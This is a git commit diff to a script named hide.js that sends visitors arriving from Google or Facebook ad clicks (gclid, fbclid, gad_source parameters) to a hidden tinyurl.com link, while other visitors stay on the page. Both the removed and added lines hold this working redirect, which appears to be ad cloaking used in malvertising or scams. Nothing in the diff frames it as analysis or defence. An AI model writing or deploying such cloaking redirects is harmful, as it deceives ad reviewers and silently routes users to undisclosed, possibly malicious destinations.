7b909362a7d7b9afb492d938442912d8497c1801
rextanym <qq365hr@Gmail.com>
2025-04-05 17:11:40 +0800

    Update hide.js

--- hide.js
+++ hide.js
@@ -1,6 +1,6 @@
 (function(){
-  var q = window.location.search;
-  if (/(gclid=|fbclid=|gad_source=)/.test(q)) {
-    window.location.replace('https://tinyurl.com/3dd9hyfz');
+  var params = window.location.search;
+  if (params.indexOf('gclid=') !== -1 || params.indexOf('fbclid=') !== -1 || params.indexOf('gad_source=') !== -1) {
+    window.location.href = 'https://tinyurl.com/3dd9hyfz';
   }
 })();
